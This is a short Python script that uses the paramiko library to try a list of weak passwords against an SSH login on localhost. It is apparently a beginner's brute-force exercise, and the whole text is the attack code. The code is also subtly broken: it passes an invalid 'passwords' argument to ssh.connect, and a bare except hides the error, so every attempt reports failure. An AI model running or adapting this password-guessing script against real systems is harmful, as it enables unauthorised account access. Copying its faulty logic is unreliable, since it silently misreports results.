import paramiko # ssh library

target = "127.0.0.1" # target IP (user your own test machine)
username = "testuser"    # username to tray


# list of passwords  to test
passwords = ['1234', 'passwords', 'qwerty', 'test']

def try_login(passwords):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=22, username=username, passwords=passwords, timeout=1)
        print(f"[+] Succes! Passwords found: {passwords}")
        ssh.close()
    except:
        print(f"[-] Failed with password: {passwords}")

for pwd in passwords:
    try_login(pwd)
